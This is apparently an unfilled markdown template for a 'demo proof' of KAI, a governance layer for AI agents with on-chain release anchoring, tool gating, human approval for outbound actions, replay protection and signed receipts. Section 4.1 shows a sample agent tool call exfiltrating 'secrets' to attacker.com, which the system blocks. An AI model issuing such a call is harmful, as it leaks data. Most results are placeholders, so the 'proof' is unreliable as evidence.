# KAI v0.1-beta Demo Proof

This document contains immutable proof of the KAI governance system functioning as designed.

## Demo Environment

| Property | Value |
|----------|-------|
| Demo Date | `[YYYY-MM-DD HH:MM UTC]` |
| KAI Version | 0.1-beta |
| Commit Hash | `[git commit sha]` |
| Chain | `[Sepolia / Base Sepolia / Local Anvil]` |
| Contract Address | `[0x...]` |

## 1. Governance Release

**Release Root Hash:**
```
[sha256 hash of governance release]
```

**Signed Manifest:**
```json
[manifest.json content]
```

**Signer Address:**
```
[0x... ethereum address]
```

## 2. On-Chain Anchor Transaction

**Transaction Hash:**
```
[0x... tx hash]
```

**Block Number:** `[block #]`

**Block Explorer Link:**
```
[https://sepolia.etherscan.io/tx/0x...]
```

**Anchored Data:**
```
releaseRootHash: [hash]
version: [version string]
timestamp: [unix timestamp]
```

## 3. Verify-Live Output

```
$ kai verify-live -m manifest.json --rpc-url https://sepolia.infura.io/v3/...

╔════════════════════════════════════════════════════╗
║         KAI Live Verification                      ║
╚════════════════════════════════════════════════════╝

✔ Local governance loaded
  Version: 1.0.0
  Root hash: 0x3dc2bd8a17b74f4c3d...

✔ On-chain verification PASSED
  Block: [block number]
  On-chain version: 1.0.0

Status:

  ╔════════════════════════════════════════════════════╗
  ║   RUNNING VERIFIED RELEASE v1.0.0                  ║
  ╚════════════════════════════════════════════════════╝

  Root: 0x3dc2bd8a17b74f4c3d8e9f2a1b5c7d0e4f6a8b9c...
```

**This single box is the whole story in one frame.**

## 4. Adversarial Demo Results

### 4.1 Tool Gating (Blocked Disallowed Tool)

**Attempted Action:**
```json
{
  "tool_name": "exfiltrate_data",
  "parameters": { "target": "http://attacker.com", "data": "secrets" }
}
```

**Result:**
```
❌ BLOCKED: Tool 'exfiltrate_data' not in allowed registry
   Session: [session_id]
   Sequence: [#]
```

### 4.2 Approval Required Tool

**Attempted Action:**
```json
{
  "tool_name": "send_email",
  "parameters": { "to": "external@example.com", "body": "..." }
}
```

**Result:**
```
⏸️  APPROVAL REQUIRED
   Tool: send_email
   Reason: Egress tool requires human approval
   Request ID: [uuid]
   Expires: [timestamp]
```

**After Approval:**
```
✅ APPROVED AND EXECUTED
   Approval Token: [hash]
   Receipt: [receipt_hash]
```

### 4.3 Replay Attack Prevention

**Replayed Token:**
```json
{
  "nonce": "[previously used nonce]",
  "signature": "[valid signature]"
}
```

**Result:**
```
❌ REJECTED: Nonce already spent
   Original use: [timestamp]
   Replay attempt: [timestamp]
```

### 4.4 Receipt Chain Verification

**Chain Statistics:**
```
Session: [session_id]
Total Receipts: [#]
Chain Valid: ✅
Merkle Batches Anchored: [#]
```

**Sample Receipt:**
```json
{
  "receipt_hash": "[hash]",
  "prev_receipt_hash": "[hash]",
  "sequence_number": [#],
  "signature": "[sig]",
  "signer_address": "[0x...]"
}
```

## 5. Test Suite Snapshot

```
$ npm test

 ✓ test/tool-executor.test.ts      (21 tests)
 ✓ test/receipt-generator.test.ts  (47 tests)
 ✓ test/integration.test.ts        (32 tests)
 ✓ test/approval-ux.test.ts        (34 tests)
 ✓ test/approval-tokens.test.ts    (19 tests)
 ✓ test/storage-healthcheck.test.ts (28 tests)
 ✓ test/smuggling-defense.test.ts  (39 tests)
 ✓ test/key-management.test.ts     (52 tests)
 ✓ test/release-builder.test.ts    (25 tests)
 ✓ test/secure-signer.test.ts      (22 tests)

 Test Files  10 passed (10)
      Tests  319 passed (319)
```

## 6. Cryptographic Verification

Anyone can independently verify this demo:

```bash
# Clone at the tagged commit
git clone https://github.com/[repo] && git checkout v0.1-beta

# Rebuild and compare root hash
kai build -d ./governance
# Should produce identical root hash: [hash]

# Verify on-chain anchor
kai verify-live --rpc-url [url] --contract [addr]
# Should confirm match
```

---

**This document serves as a permanent receipt for our receipts.**

Generated: `[timestamp]`
Signed by: `[maintainer]`
